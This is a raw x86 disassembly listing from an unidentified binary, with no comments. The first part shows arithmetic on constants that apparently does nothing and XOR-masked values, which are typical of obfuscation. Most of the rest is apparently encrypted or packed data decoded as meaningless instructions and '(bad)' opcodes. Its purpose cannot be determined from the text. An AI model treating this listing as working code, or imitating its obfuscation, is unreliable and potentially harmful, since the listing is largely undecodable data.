  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x428409
  41d412:	xor    DWORD PTR ds:0x4284d5,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42857d,0x428339
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428569,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x428429,0x0
  41d45e:	mov    DWORD PTR ds:0x42854d,0x177e
  41d468:	mov    DWORD PTR ds:0x4284c9,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x4284d9
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428371,edx
  41d488:	cmp    DWORD PTR ds:0x428429,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428571
  41d49a:	push   0x428165
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x428545,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428389
  41d4c0:	mov    esi,DWORD PTR ds:0x4283e5
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428571,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428575,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42836d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42857d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428375,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428561,0x0
  41d53c:	mov    DWORD PTR ds:0x428465,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428465,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428375,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428561,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42827f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x428339,0x7656
  41d59f:	sbb    DWORD PTR ds:0x428501,edx
  41d5a5:	xor    DWORD PTR ds:0x428349,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x428439
  41d5b5:	add    edx,DWORD PTR ds:0x4284dd
  41d5bb:	mov    DWORD PTR ds:0x428439,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x428339
  41d5ca:	add    DWORD PTR ds:0x4284f5,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x61dd6af2]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0xd8
  41d64a:	pop    ss
  41d64b:	pop    esp
  41d64c:	mov    ecx,DWORD PTR [edx]
  41d64e:	pop    esi
  41d64f:	dec    esp
  41d650:	sub    BYTE PTR [eax-0x26cb52db],bl
  41d656:	pop    ds
  41d657:	mov    edi,0xcef3a423
  41d65c:	dec    ebx
  41d65d:	sub    DWORD PTR [eax-0x694b2e1b],esi
  41d663:	xchg   ecx,eax
  41d664:	scas   al,BYTE PTR es:[edi]
  41d665:	cmc    
  41d666:	jne    0x41d6bf
  41d668:	cmp    edx,DWORD PTR [esp+ebp*8-0x532dc352]
  41d66f:	fs cmp al,dh
  41d672:	dec    esp
  41d673:	push   es
  41d674:	mov    al,0x89
  41d676:	pop    edi
  41d677:	push   cs
  41d678:	push   edi
  41d679:	sub    ah,BYTE PTR [ebx+0x5e71e22b]
  41d67f:	add    ecx,esi
  41d681:	fdivr  DWORD PTR [ebp+0x57]
  41d684:	cld    
  41d685:	sub    BYTE PTR [edi+ecx*4+0x5299b88d],al
  41d68c:	dec    esp
  41d68d:	popa   
  41d68e:	ins    DWORD PTR es:[edi],dx
  41d68f:	adc    al,0xc6
  41d691:	sti    
  41d692:	adc    BYTE PTR [eax+0x4c272f43],ch
  41d698:	pop    ebx
  41d699:	cwde   
  41d69a:	rcr    BYTE PTR [edx],1
  41d69c:	jno    0x41d6cd
  41d69e:	sar    DWORD PTR [ecx+0x14],cl
  41d6a1:	cmp    eax,DWORD PTR [ebp-0x4a]
  41d6a4:	lahf   
  41d6a5:	sub    eax,0xead61468
  41d6aa:	xchg   edi,eax
  41d6ab:	ret    0x6294
  41d6ae:	sahf   
  41d6af:	lahf   
  41d6b0:	(bad)  
  41d6b1:	pop    ebp
  41d6b2:	scas   eax,DWORD PTR es:[edi]
  41d6b3:	dec    edi
  41d6b4:	push   ss
  41d6b5:	out    dx,eax
  41d6b6:	adc    ecx,ebp
  41d6b8:	jo     0x41d68d
  41d6ba:	mov    bl,0xf2
  41d6bc:	add    al,0xfc
  41d6be:	fst    st(7)
  41d6c0:	adc    esp,DWORD PTR [eax]
  41d6c2:	add    ch,cl
  41d6c4:	test   al,0x60
  41d6c6:	test   BYTE PTR [edi+ebp*1+0x39],dl
  41d6ca:	push   edi
  41d6cb:	iret   
  41d6cc:	imul   ebx,esp,0xffffffa2
  41d6cf:	hlt    
  41d6d0:	sbb    eax,0x393037fe
  41d6d5:	aad    0xf3
  41d6d7:	cwde   
  41d6d8:	dec    edi
  41d6d9:	xchg   ecx,eax
  41d6da:	not    DWORD PTR [ebp+0x2f]
  41d6dd:	dec    ebx
  41d6de:	and    DWORD PTR [ebp-0x49765f2f],edi
  41d6e4:	leave  
  41d6e5:	mov    al,ds:0x220c2dc0
  41d6ea:	lds    ebx,FWORD PTR [ebp-0x51]
  41d6ed:	data16 int3 
  41d6ef:	mov    bl,0x81
  41d6f1:	pusha  
  41d6f2:	push   ebx
  41d6f3:	xlat   BYTE PTR ds:[ebx]
  41d6f4:	push   cs
  41d6f5:	add    dl,BYTE PTR [edi]
  41d6f7:	retfw  0x9b0
  41d6fb:	je     0x41d74c
  41d6fd:	loop   0x41d71a
  41d6ff:	ins    BYTE PTR es:[edi],dx
  41d700:	fmul   DWORD PTR [edx+ebx*2+0x5075eba6]
  41d707:	bound  edi,QWORD PTR [ebx]
  41d709:	push   cs
  41d70a:	jns    0x41d6b2
  41d70c:	sbb    BYTE PTR [esi+0x5141a2a7],ch
  41d712:	mov    ah,0x66
  41d714:	sub    eax,0x602ae1aa
  41d719:	ror    DWORD PTR [eax],cl
  41d71b:	jp     0x41d6ea
  41d71d:	xchg   ecx,eax
  41d71e:	scas   al,BYTE PTR es:[edi]
  41d71f:	cwde   
  41d720:	push   ebp
  41d721:	jns    0x41d6a5
  41d723:	fisttp WORD PTR [eax-0x22]
  41d726:	daa    
  41d727:	xchg   edx,eax
  41d728:	pop    es
  41d729:	fs pop ebx
  41d72b:	stc    
  41d72c:	dec    di
  41d72e:	aaa    
  41d72f:	adc    DWORD PTR [ebp-0x41],edx
  41d732:	or     al,0x1f
  41d734:	cmp    BYTE PTR [ecx+0x26],ah
  41d737:	fst    QWORD PTR [ebp-0xd514def]
  41d73d:	push   0xffffffae
  41d73f:	inc    eax
  41d740:	mov    cl,BYTE PTR [esi-0x4f]
  41d743:	fisubr DWORD PTR [esi-0x40]
  41d746:	jo     0x41d707
  41d748:	cwde   
  41d749:	inc    esp
  41d74a:	or     eax,0xe3a2f8e4
  41d74f:	sbb    esp,DWORD PTR [edi+ebx*4]
  41d752:	xor    eax,0x5bef83a6
  41d757:	add    DWORD PTR [ecx+0x9dc05ba],0x7f
  41d75e:	int3   
  41d75f:	mov    edx,0xa9d72e5c
  41d764:	js     0x41d778
  41d766:	or     cl,dl
  41d768:	fdivrp st(5),st
  41d76a:	ror    BYTE PTR [esi-0x33],1
  41d76d:	xchg   ecx,eax
  41d76e:	jno    0x41d7dc
  41d770:	adc    DWORD PTR ds:0x6c169c0,0xaf7d5975
  41d77a:	iret   
  41d77b:	pusha  
  41d77c:	dec    ecx
  41d77d:	scas   al,BYTE PTR es:[edi]
  41d77e:	fisub  DWORD PTR [esi-0x14cdbd41]
  41d784:	addr16 mov dh,0xe9
  41d787:	pop    ecx
  41d788:	daa    
  41d789:	jo     0x41d735
  41d78b:	pop    ebx
  41d78c:	sub    edi,ecx
  41d78e:	mov    ecx,DWORD PTR [ebx-0x5d03e799]
  41d794:	inc    edx
  41d795:	je     0x41d75f
  41d797:	sti    
  41d798:	rcl    DWORD PTR [ebx],0x24
  41d79b:	cmc    
  41d79c:	mov    ah,0x8d
  41d79e:	cmc    
  41d79f:	cmp    ebp,DWORD PTR [edi-0x5a268a64]
  41d7a5:	fiadd  DWORD PTR [esi]
  41d7a7:	xor    cl,0xee
  41d7aa:	aad    0x47
  41d7ac:	fs out 0x56,eax
  41d7af:	sub    esi,DWORD PTR [edx+0x1c]
  41d7b2:	sub    ebx,ecx
  41d7b4:	lea    esp,[edi-0x3d0eb87]
  41d7ba:	mov    eax,0x156eb809
  41d7bf:	xchg   ebp,eax
  41d7c0:	xchg   edx,eax
  41d7c1:	and    ebp,edx
  41d7c3:	mov    ch,0x94
  41d7c5:	les    eax,FWORD PTR [ebx]
  41d7c7:	loopne 0x41d7c4
  41d7c9:	mov    BYTE PTR [ebx-0x39c09c33],ch
  41d7cf:	hlt    
  41d7d0:	dec    ebx
  41d7d1:	cmp    BYTE PTR [eax+0x326be79e],al
  41d7d7:	add    DWORD PTR [esi+0x5d],0xffffff87
  41d7db:	stc    
  41d7dc:	push   eax
  41d7dd:	or     BYTE PTR [ebx+0x69],bh
  41d7e0:	pop    ds
  41d7e1:	mov    ch,0xf3
  41d7e3:	inc    edx
  41d7e4:	cli    
  41d7e5:	addr16 cld 
  41d7e7:	test   eax,0xfb729f10
  41d7ec:	jnp    0x41d800
  41d7ee:	pushf  
  41d7ef:	call   0xa6a8:0x71d214b2
  41d7f6:	xchg   esi,eax
  41d7f7:	push   esi
  41d7f8:	cli    
  41d7f9:	mov    ch,0x28
  41d7fb:	sub    al,al
  41d7fd:	mov    esp,0x3aaa4924
  41d802:	dec    sp
  41d804:	es and edi,esp
  41d807:	push   esp
  41d808:	xchg   edi,ebp
  41d80a:	xchg   DWORD PTR [ecx-0x47],eax
  41d80d:	cdq    
  41d80e:	adc    al,0x6
  41d810:	addr16 push 0xffffffe6
  41d813:	call   FWORD PTR [edx]
  41d815:	adc    ah,BYTE PTR [edi-0x799122e1]
  41d81b:	cwde   
  41d81c:	cmp    eax,0xd5c69eb2
  41d821:	jle    0x41d856
  41d823:	out    dx,eax
  41d824:	xchg   esp,eax
  41d825:	mov    al,BYTE PTR es:[ebx-0x6c]
  41d829:	nop
  41d82a:	sbb    dh,BYTE PTR [ebx+0x42a32a71]
  41d830:	in     al,dx
  41d831:	in     eax,0xe6
  41d833:	aas    
  41d834:	push   0xffffffb3
  41d836:	div    eax
  41d838:	repnz add DWORD PTR [ebx+ebx*2-0x5],esp
  41d83d:	loop   0x41d807
  41d83f:	fdiv   DWORD PTR [edi]
  41d841:	pop    ebx
  41d842:	add    ah,ch
  41d844:	inc    eax
  41d845:	pop    edx
  41d846:	mov    bh,0x57
  41d848:	jle    0x41d800
  41d84a:	push   es
  41d84b:	ins    DWORD PTR es:[edi],dx
  41d84c:	in     eax,dx
  41d84d:	or     DWORD PTR [ebp+0x13f28e17],edi
  41d853:	imul   ebp,edi,0x31b33aab
  41d859:	popf   
  41d85a:	js     0x41d7fb
  41d85c:	stc    
  41d85d:	cmp    DWORD PTR [ebx+0x6f149603],ebp
  41d863:	inc    esi
  41d864:	cmp    dl,bh
  41d866:	mov    dl,0x6f
  41d868:	in     al,dx
  41d869:	shr    BYTE PTR ds:0xf5abaa3d,0x21
  41d870:	lods   al,BYTE PTR ds:[esi]
  41d871:	outs   dx,BYTE PTR ds:[esi]
  41d872:	mov    ?,esp
  41d874:	sbb    BYTE PTR [edi-0x118f1705],al
  41d87a:	push   edx
  41d87b:	call   0x6fe0ac20
  41d880:	sub    BYTE PTR [ebx-0x4d],cl
  41d883:	inc    ecx
  41d884:	xchg   BYTE PTR [ebx],ah
  41d886:	pop    eax
  41d887:	push   eax
  41d888:	es dec eax
  41d88a:	mov    edx,0xef5fb645
  41d88f:	dec    esp
  41d890:	jp     0x41d8de
  41d892:	cld    
  41d893:	aad    0xb3
  41d895:	lea    edx,[ebp-0x62925bf1]
  41d89b:	pop    ds
  41d89c:	xchg   ebp,eax
  41d89d:	lea    eax,[edi+0x6b]
  41d8a0:	jge    0x41d91a
  41d8a2:	repz push ecx
  41d8a4:	lds    ecx,FWORD PTR ds:0x8554af44
  41d8aa:	push   edi
  41d8ab:	int3   
  41d8ac:	xchg   esp,esp
  41d8ae:	xchg   BYTE PTR [edx+0x6f3ef106],bl
  41d8b4:	push   esi
  41d8b5:	sub    edi,0xffffff9e
  41d8b8:	sar    DWORD PTR [esi-0x10],cl
  41d8bb:	cmp    eax,0x9eaf32a2
  41d8c0:	enter  0xa587,0xc7
  41d8c4:	xor    esi,eax
  41d8c6:	or     cl,BYTE PTR [edi+0x31]
  41d8c9:	or     dh,BYTE PTR [edx+0x2243f082]
  41d8cf:	cmp    DWORD PTR [edi],0x2234e3d6
  41d8d5:	inc    eax
  41d8d6:	mov    bl,BYTE PTR [edi+0x14cfa7ae]
  41d8dc:	sar    BYTE PTR [edi],cl
  41d8de:	xchg   edx,eax
  41d8df:	fsub   st(4),st
  41d8e1:	xchg   DWORD PTR [esi+0x6b7cb03d],ebp
  41d8e7:	xor    ecx,DWORD PTR [edx]
  41d8e9:	daa    
  41d8ea:	inc    esp
  41d8eb:	dec    esi
  41d8ec:	mov    DWORD PTR [edi],ebx
  41d8ee:	mov    bh,0x62
  41d8f0:	sbb    al,0xd9
  41d8f2:	jmp    0x9f18488b
  41d8f7:	ins    BYTE PTR es:[edi],dx
  41d8f8:	mov    bh,0xb7
  41d8fa:	xor    edi,DWORD PTR [edx+0x8]
  41d8fd:	and    BYTE PTR [ecx-0x569d92dc],bl
  41d903:	cmp    DWORD PTR [eax],0x60c36f56
  41d909:	jo     0x41d92d
  41d90b:	dec    ebx
  41d90c:	add    eax,0xb3355dfa
  41d911:	and    DWORD PTR [esi+0x76],esi
  41d914:	pop    edi
  41d915:	or     BYTE PTR [edi+0x79ca600d],ah
  41d91b:	aad    0x18
  41d91d:	sbb    al,0xab
  41d91f:	mov    bh,0x52
  41d921:	(bad)  
  41d922:	jb     0x41d91c
  41d924:	jae    0x41d937
  41d926:	fld    QWORD PTR [ecx]
  41d928:	jge    0x41d974
  41d92a:	out    0x2a,al
  41d92c:	cmc    
  41d92d:	mov    al,ds:0x1845fcf3
  41d932:	xchg   esi,eax
  41d933:	add    eax,0x74294bf2
  41d938:	jbe    0x41d91b
  41d93a:	adc    eax,0x503ccd27
  41d93f:	mov    esp,0x94d7e947
  41d944:	lock inc ebp
  41d946:	sbb    al,BYTE PTR ds:0x24a60523
  41d94c:	jl     0x41d8e4
  41d94e:	xchg   esi,eax
  41d94f:	xor    BYTE PTR [ecx],0xf
  41d952:	(bad)  
  41d953:	pop    esp
  41d954:	push   edi
  41d955:	ror    DWORD PTR [eax+ebx*4-0x6386b080],1
  41d95c:	jmp    0x41d9bd
  41d95e:	shl    DWORD PTR [eax+0x67],0xda
  41d962:	inc    esp
  41d963:	pushf  
  41d964:	jge    0x41d94b
  41d966:	push   ebp
  41d967:	sub    BYTE PTR [edx+0x69],dl
  41d96a:	sti    
  41d96b:	js     0x41d93c
  41d96d:	cli    
  41d96e:	test   eax,ebp
  41d970:	push   cs
  41d971:	in     eax,0xf3
  41d973:	sbb    eax,esp
  41d975:	or     al,0xa1
  41d977:	inc    esp
  41d978:	loope  0x41d9f4
  41d97a:	imul   BYTE PTR [ebx+0x73a7675e]
  41d980:	test   BYTE PTR [eax],0x34
  41d983:	pusha  
  41d984:	xchg   ebx,eax
  41d985:	dec    ebp
  41d986:	and    dl,cl
  41d988:	ins    BYTE PTR es:[edi],dx
  41d989:	pop    esp
  41d98a:	dec    ebp
  41d98b:	add    edx,DWORD PTR [edx+0xdbf5c28]
  41d991:	ror    BYTE PTR [edi],0xfe
  41d994:	add    cl,BYTE PTR [ebp-0x48]
  41d997:	rcl    bh,0xfc
  41d99a:	xchg   edi,eax
  41d99b:	ror    DWORD PTR [esp+esi*8],cl
  41d99e:	retf   0x85f
  41d9a1:	imul   ecx,edi,0xba3fd668
  41d9a7:	fisubr WORD PTR [esi+0x4b]
  41d9aa:	(bad)  
  41d9ab:	xor    al,0x32
  41d9ad:	jge    0x41d9f6
  41d9af:	mov    edi,0xf4af6b52
  41d9b4:	(bad)  
  41d9b5:	xchg   esi,eax
  41d9b6:	add    bh,al
  41d9b8:	jge    0x41d962
  41d9ba:	jp     0x41d99c
  41d9bc:	icebp  
  41d9bd:	fwait
  41d9be:	imul   eax,DWORD PTR [edx-0x5ddc1dc4],0x57
  41d9c5:	mov    ah,0x69
  41d9c7:	retf   
  41d9c8:	jb     0x41da3f
  41d9ca:	mov    eax,ds:0x13cc9dd
  41d9cf:	xor    BYTE PTR [eax],al
  41d9d1:	jb     0x41d97a
  41d9d3:	das    
  41d9d4:	dec    esp
  41d9d5:	popf   
  41d9d6:	mov    ebp,ecx
  41d9d8:	outs   dx,DWORD PTR ds:[esi]
  41d9d9:	cmp    edx,0x57
  41d9dc:	outs   dx,BYTE PTR ds:[esi]
  41d9dd:	iret   
  41d9de:	iret   
  41d9df:	mov    esi,0x59f665ae
  41d9e4:	ret    
  41d9e5:	hlt    
  41d9e6:	ja     0x41da64
  41d9e8:	popf   
  41d9e9:	jb     0x41d96c
  41d9eb:	mov    bl,0x9e
  41d9ed:	js     0x41d99f
  41d9ef:	out    0xcf,eax
  41d9f1:	and    DWORD PTR [esi+0x6b],edx
  41d9f4:	xchg   ebx,eax
  41d9f5:	sub    ecx,DWORD PTR [ebx]
  41d9f7:	jmp    0xe525:0x8b65ef61
  41d9fe:	rol    DWORD PTR [edi+0x4a],cl
  41da01:	push   0xc4f4dbc2
  41da06:	aas    
  41da07:	call   0xf842:0xc7e4ad59
  41da0e:	push   esp
  41da0f:	icebp  
  41da10:	sub    edi,DWORD PTR [ecx-0x4f6a74a0]
  41da16:	(bad)  
  41da17:	(bad)  
  41da18:	push   DWORD PTR ds:0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x4223f5
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	cld    
  41da4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da4f:	nop
  41da50:	add    ebx,DWORD PTR [ecx-0x40]
  41da53:	mov    esi,0xbebec44a
  41da58:	pusha  
  41da59:	push   edi
  41da5a:	push   esp
  41da5b:	ret    0xcdea
  41da5e:	mov    ebx,0xd4df6e88
  41da63:	ins    BYTE PTR es:[edi],dx
  41da64:	inc    edx
  41da65:	(bad)  
  41da66:	push   ss
  41da67:	int    0x5a
  41da69:	ins    DWORD PTR es:[edi],dx
  41da6a:	sub    cl,BYTE PTR [esp+eax*2-0x24]
  41da6e:	cmp    ebp,edi
  41da70:	int    0xfa
  41da72:	pop    eax
  41da73:	push   0xbbdcfa88
  41da78:	sbb    ebp,DWORD PTR [ebx-0x67]
  41da7b:	push   edx
  41da7c:	dec    esp
  41da7d:	retf   
  41da7e:	hlt    
  41da7f:	ins    BYTE PTR es:[edi],dx
  41da80:	pop    ds
  41da81:	push   0xe840f4f3
  41da86:	lods   eax,DWORD PTR ds:[esi]
  41da87:	mov    al,ds:0x154627c9
  41da8c:	jns    0x41da1a
  41da8e:	pop    ebx
  41da8f:	jnp    0x41da68
  41da91:	test   DWORD PTR [ecx+0x4d8ed15e],ebx
  41da97:	out    0x93,al
  41da99:	push   0x74
  41da9b:	mov    bh,dl
  41da9d:	xchg   ecx,eax
  41da9e:	lds    esi,FWORD PTR [esp+ecx*8+0x55]
  41daa2:	push   ss
  41daa3:	ds icebp 
  41daa5:	mov    bl,ch
  41daa7:	(bad)  
  41daa8:	pop    edx
  41daa9:	xor    edi,DWORD PTR [esi]
  41daab:	xor    esi,DWORD PTR [eax]
  41daad:	fnstenv [edi+0x61a6129c]
  41dab3:	fild   WORD PTR [ebp+0x2f]
  41dab6:	out    dx,al
  41dab7:	ins    BYTE PTR es:[edi],dx
  41dab8:	adc    DWORD PTR [edi-0x2],edx
  41dabb:	lods   al,BYTE PTR ds:[esi]
  41dabc:	dec    ecx
  41dabd:	jbe    0x41db08
  41dabf:	imul   edx,DWORD PTR [eax],0xffffff95
  41dac2:	in     al,dx
  41dac3:	or     dl,dl
  41dac5:	(bad)  
  41dac6:	adc    bh,BYTE PTR [esi-0x4d]
  41dac9:	mov    bh,0x15
  41dacb:	xor    DWORD PTR [ebx+eiz*8+0xc21c90e],0xf9c69ec7
  41dad6:	imul   esi,DWORD PTR [esi],0xcf147d55
  41dadc:	dec    edx
  41dadd:	xor    eax,0xe538d5b0
  41dae2:	mov    bh,BYTE PTR [esi]
  41dae4:	(bad)  
  41dae5:	xlat   BYTE PTR ds:[ebx]
  41dae6:	and    ah,BYTE PTR [esi+0x78]
  41dae9:	adc    cl,0x12
  41daec:	jb     0x41db52
  41daee:	fadd   QWORD PTR [esi]
  41daf0:	fs mov bh,0xd5
  41daf3:	lods   eax,DWORD PTR ds:[esi]
  41daf4:	scas   eax,DWORD PTR es:[edi]
  41daf5:	add    al,0xe6
  41daf7:	mov    ecx,0x12a7d2db
  41dafc:	mov    eax,0xe9accee2
  41db01:	cld    
  41db02:	ss loopne 0x41db0e
  41db05:	push   cs
  41db06:	mov    dl,0xca
  41db08:	das    
  41db09:	xor    dh,al
  41db0b:	xchg   edx,eax
  41db0d:	adc    al,BYTE PTR [esi+0x54]
  41db10:	mov    edi,0x68f83661
  41db15:	sub    BYTE PTR [ebp-0x10],cl
  41db18:	adc    DWORD PTR [eax-0x44],0x16344771
  41db1f:	mul    ebp
  41db21:	mov    edi,0x3558cc06
  41db26:	mov    WORD PTR [ecx+0x27],cs
  41db29:	(bad)  
  41db2b:	pop    ebx
  41db2c:	retf   
  41db2d:	rol    bl,0xaa
  41db30:	lods   eax,DWORD PTR ds:[esi]
  41db31:	dec    esp
  41db32:	enter  0x7e0e,0x91
  41db36:	jp     0x41dba8
  41db38:	mov    bl,0x4c
  41db3a:	xchg   edx,eax
  41db3b:	adc    eax,0x376b643d
  41db40:	sub    al,0x5
  41db42:	in     eax,dx
  41db43:	mov    WORD PTR [bx+si],es
  41db46:	ja     0x41dadc
  41db48:	scas   al,BYTE PTR es:[edi]
  41db49:	inc    ecx
  41db4a:	jnp    0x41dbbc
  41db4c:	cs ds pop esp
  41db4f:	pop    ecx
  41db50:	inc    eax
  41db51:	inc    BYTE PTR [esi-0x4d]
  41db54:	mov    esp,0xa61575be
  41db59:	js     0x41dbda
  41db5b:	fsub   QWORD PTR [esi]
  41db5d:	sti    
  41db5e:	mov    BYTE PTR [edx-0x74],ch
  41db61:	fild   WORD PTR [edx+0x1e]
  41db64:	adc    eax,0xb5627727
  41db69:	ss test edi,0x472925fc
  41db70:	dec    eax
  41db71:	clc    
  41db72:	lea    ecx,[eax-0x73]
  41db75:	outs   dx,BYTE PTR ds:[esi]
  41db76:	xor    cl,BYTE PTR [eax+0x78]
  41db79:	or     dh,BYTE PTR [ecx+ebx*8-0xf4a3430]
  41db80:	mov    ecx,0xaa5fdff2
  41db85:	ficomp DWORD PTR [esi-0x58738e34]
  41db8b:	test   al,0x47
  41db8d:	and    eax,0x27b60e01
  41db92:	xlat   BYTE PTR ds:[ebx]
  41db93:	push   ecx
  41db94:	mov    ebx,DWORD PTR [edi-0x60283535]
  41db9a:	inc    edx
  41db9b:	push   0x362725f8
  41dba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba1:	leave  
  41dba2:	arpl   WORD PTR ds:0x620d74ad,cx
  41dba8:	xor    DWORD PTR [esi-0x1b],0x58
  41dbac:	in     al,dx
  41dbad:	xchg   esp,eax
  41dbae:	jne    0x41db54
  41dbb0:	call   0xa60b8c1d
  41dbb5:	or     eax,0x33ccc098
  41dbba:	js     0x41dc36
  41dbbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbbd:	lahf   
  41dbbe:	push   0x650a04c
  41dbc3:	pop    ebx
  41dbc4:	fs cld 
  41dbc6:	sti    
  41dbc7:	dec    ecx
  41dbc8:	add    eax,0xffffff89
  41dbcb:	outs   dx,BYTE PTR ds:[esi]
  41dbcc:	fcomp  st(5)
  41dbce:	xchg   ebx,ebx
  41dbd0:	mov    dh,0x57
  41dbd2:	jecxz  0x41dc0f
  41dbd4:	jbe    0x41dbfc
  41dbd6:	mov    dl,0xf0
  41dbd8:	popa   
  41dbd9:	xor    eax,0x56518894
  41dbde:	xchg   ebx,eax
  41dbdf:	pop    ecx
  41dbe0:	addr16 daa 
  41dbe2:	cmp    edi,DWORD PTR [edx-0xb]
  41dbe5:	and    DWORD PTR [edx+edx*1-0x4c],ecx
  41dbe9:	and    DWORD PTR [ecx+eax*8-0xb],ebx
  41dbed:	fcomip st,st(1)
  41dbef:	fs in  eax,dx
  41dbf1:	inc    BYTE PTR [eax]
  41dbf3:	and    eax,0x3349eecb
  41dbf8:	mov    fs,esp
  41dbfa:	fld    QWORD PTR [esi]
  41dbfc:	imul   edi,ecx,0xffffffaf
  41dbff:	jp     0x41dc0c
  41dc01:	imul   ebp,DWORD PTR [ecx+0x53467c7b],0xffffff9b
  41dc08:	mov    ebx,ebx
  41dc0a:	push   cs
  41dc0b:	xchg   ecx,eax
  41dc0c:	call   0xd2fc:0x53c4118c
  41dc13:	gs pusha 
  41dc15:	scas   al,BYTE PTR es:[edi]
  41dc16:	xor    eax,esi
  41dc18:	inc    edx
  41dc19:	sbb    BYTE PTR [ecx],dh
  41dc1b:	cwde   
  41dc1c:	mov    bh,0x81
  41dc1e:	out    dx,al
  41dc1f:	dec    esp
  41dc20:	fwait
  41dc21:	push   esp
  41dc22:	dec    ecx
  41dc23:	rcr    BYTE PTR [ecx-0x46],0x5
  41dc27:	pop    es
  41dc28:	ins    DWORD PTR es:[edi],dx
  41dc29:	mov    ?,WORD PTR [ebp+edx*4-0x2d962667]
  41dc30:	inc    ecx
  41dc31:	fisub  WORD PTR [ecx+0x3c]
  41dc34:	retf   0x56cc
  41dc37:	mov    edi,0x3fc0eae4
  41dc3c:	xor    ebx,DWORD PTR [ecx+edi*4-0x6f]
  41dc40:	sbb    eax,0x52635708
  41dc45:	adc    bl,ah
  41dc47:	(bad)  
  41dc49:	cmc    
  41dc4a:	and    al,0x25
  41dc4c:	hlt    
